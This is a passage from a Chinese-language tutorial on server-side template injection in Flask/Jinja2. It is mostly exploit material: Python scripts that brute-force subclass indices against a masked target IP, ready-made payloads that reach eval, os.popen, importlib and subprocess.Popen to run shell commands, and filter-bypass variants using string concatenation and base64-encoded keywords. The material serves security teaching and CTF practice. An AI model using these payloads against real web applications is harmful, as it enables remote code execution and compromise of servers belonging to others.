        url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"
        res = requests.get(url=url, headers=headers)
        if 'eval' in res.text:
            print(i)
    # 得到一大堆子类的索引:
    64
    65
    66
    67
    68
    79
    80
    81
    83
    91
    92
    93
    94
    95
    96
    117
    ...
我们可以记下几个含有eval函数的类：
  * warnings.catch_warnings
  * WarningMessage
  * codecs.IncrementalEncoder
  * codecs.IncrementalDecoder
  * codecs.StreamReaderWriter
  * os._wrap_close
  * reprlib.Repr
  * weakref.finalize
  * ......
所以payload如下：
    {{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
我们可以看到，使用eval函数执行命令也是调用的os模块，那我们直接调用os模块不是更简单？
### 寻找 os 模块执行命令
Python的 os
模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。
首先编写脚本遍历目标Python环境中含有os模块的类的索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    for i in range(500):
        url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"
        res = requests.get(url=url, headers=headers)
        if 'os.py' in res.text:
            print(i)
    # 可以得到一大堆类
    64
    65
    66
    67
    68
    79
    80
    81
    83
    117
    147
    154
    161
    162
    163
    164
    ...
随便挑一个类构造payload执行命令即可：
    {{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}}
但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。
我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是
`os._wrap_close`，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。
### 寻找 popen 函数执行命令
首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    for i in range(500):
        url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"
        res = requests.get(url=url, headers=headers)
        if 'popen' in res.text:
            print(i)
    # 得到编号为117
直接构造payload即可：
    {{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}
这样得到的索引还是很准确的。
除了这种方法外，我们还可以直接导入os模块，python有一个importlib类，可用load_module来导入你需要的模块。
### 寻找 importlib 类执行命令
Python 中存在 `` 类，目的就是提供 Python 中
import 语句的实现（以及 `__import__` 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os
模块执行命令。
首先编写脚本遍历目标Python环境中 importlib 类的索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    for i in range(500):
        url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
        res = requests.get(url=url, headers=headers)
        if '_frozen_importlib.BuiltinImporter' in res.text:
            print(i)
    # 得到编号为69
构造如下payload即可执行命令：
    {{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls /").read()}}
### 寻找 linecache 函数执行命令
linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。
首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    for i in range(500):
        url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"
        res = requests.get(url=url, headers=headers)
        if 'linecache' in res.text:
            print(i)
    # 得到一堆子类的索引:
    168
    169
    203
    206
    207
    208
    ...
随便挑一个子类构造payload即可：
    {{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
    {{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}
### 寻找 subprocess.Popen 类执行命令
从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。
subprocess 意在替代其他几个老的模块或者函数，比如：`os.system`、`os.popen` 等函数。
首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    for i in range(500):
        url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
        res = requests.get(url=url, headers=headers)
        if 'linecache' in res.text:
            print(i)
    # 得到索引为245
则构造如下payload执行命令即可：
    {{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}
    # {{[].__class__.__base__.__subclasses__()[245]('要执行的命令',shell=True,stdout=-1).communicate()[0].strip()}}
# Flask-jinja2 SSTI Bypass姿势
## 关键字绕过
### 利用字符串拼接绕过
我们可以利用“+”进行字符串拼接，绕过关键字过滤，例如：
    {{().__class__.__bases__[0].__subclasses__()[40]('/fl'+'ag').read()}}
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("o"+"s").popen("ls /").read()')}}
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil'+'tins__']['eval']('__import__("os").popen("ls /").read()')}}
只要返回的是 **字典类型** 的或是 **字符串格式** 的，即payload中引号内的，在调用的时候都可以使用字符串拼接绕过。
### 利用编码绕过
我们可以利用对关键字编码的方法，绕过关键字过滤，例如用base64编码绕过：
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}
等同于：
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}